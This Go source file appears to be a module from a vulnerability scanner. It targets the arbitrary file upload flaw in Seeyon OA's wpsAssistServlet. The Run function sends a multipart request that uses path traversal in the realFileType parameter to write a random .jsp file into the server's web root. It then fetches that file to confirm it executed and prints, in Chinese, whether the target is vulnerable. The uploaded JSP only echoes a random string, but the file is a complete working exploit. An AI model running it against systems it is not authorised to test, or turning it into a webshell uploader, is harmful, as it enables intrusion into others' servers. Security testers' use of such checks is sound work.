package A8_wpsAssistServlet

import (
	"fmt"
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"math/rand"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36"
)

func generateRandomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	rand.Seed(time.Now().UnixNano())
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func Run(url string) {
	randFile := generateRandomString(10) + ".jsp"
	randBoundary := generateRandomString(20)
	randContent := generateRandomString(10)

	uploadUrl := url + "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/" + randFile + "&fileId=2"
	verifyUrl := url + "/" + randFile

	// Step 1: Upload the file
	uploadData := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"123.xls\"\r\nContent-Type: application/vnd.ms-excel\r\n\r\n<%% out.println(\"%s\");%%>\r\n--%s--", randBoundary, randContent, randBoundary)
	_, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":      UA,
			"Accept":          "*/*",
			"Connection":      "close",
			"Content-Type":    "multipart/form-data; boundary=" + randBoundary,
			"Accept-Encoding": "gzip, deflate",
		}).
		SetBodyString(uploadData).
		Post(uploadUrl)

	if err != nil {
		color.Red.Println("[-]	致远OA wpsAssistServlet 任意文件上传漏洞不存在")
		return
	}

	// Step 2: Check if the file was uploaded successfully
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":      UA,
			"Accept":          "*/*",
			"Connection":      "close",
			"Content-Type":    "application/x-www-form-urlencoded",
			"Accept-Encoding": "gzip, deflate, br",
		}).
		Get(verifyUrl)

	if err != nil {
		color.Red.Println("[-]	致远OA wpsAssistServlet 任意文件上传漏洞不存在")
		return
	}

	if resp.StatusCode == 200 && resp.String() == randContent {
		color.Green.Println("[+]致远OA wpsAssistServlet 任意文件上传漏洞存在 -> ", url)
	} else {
		color.Red.Println("[-]	致远OA wpsAssistServlet 任意文件上传漏洞不存在")
	}
}
